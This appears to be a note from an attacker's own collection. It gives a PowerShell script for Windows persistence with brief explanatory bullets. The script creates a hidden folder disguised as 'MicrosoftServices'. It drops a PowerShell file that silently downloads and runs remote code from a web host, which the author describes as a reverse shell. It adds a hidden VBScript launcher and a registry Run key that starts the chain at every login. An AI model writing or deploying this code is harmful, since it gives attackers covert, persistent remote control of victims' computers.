# Powershell commands 


## 1. Running the script on login

```
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$folderPath = Join-Path -Path $documentsPath -ChildPath "MicrosoftServices"

if (-not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
}

$xContent = @'
powershell -c "Start-Process -WindowStyle Hidden powershell -ArgumentList '-c iex ((irm -Uri ''https://xyz.vercel.app'' -Headers @{''Authorization''=''Bearer xxx''}))'"
'@
$xPath = Join-Path -Path $folderPath -ChildPath "x.ps1"
Set-Content -Path $xPath -Value $xContent

# VBScript (y.vbs) content (fixed version)
$yContent = @'
Set objShell = CreateObject("WScript.Shell")
userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
scriptPath = userProfile & "\Documents\MicrosoftServices\x.ps1"
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & scriptPath & """", 0, False
'@
$yPath = Join-Path -Path $folderPath -ChildPath "y.vbs"
Set-Content -Path $yPath -Value $yContent

Set-ItemProperty -Path $folderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $xPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $yPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "MicrosoftServices"
$regValue = "wscript.exe `"$yPath`""

if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String | Out-Null
}

Write-Host "1"
```
What this does:
- creating a hidden folder `MicrosoftServices` in the user's Documents folder (can be anywhere)
- adds a .ps1 script that contains the api call for the revershe Shell script
- adds a vbs script that runs the powershell script in the background
- creates a HKCU registry key that runs the vbs file
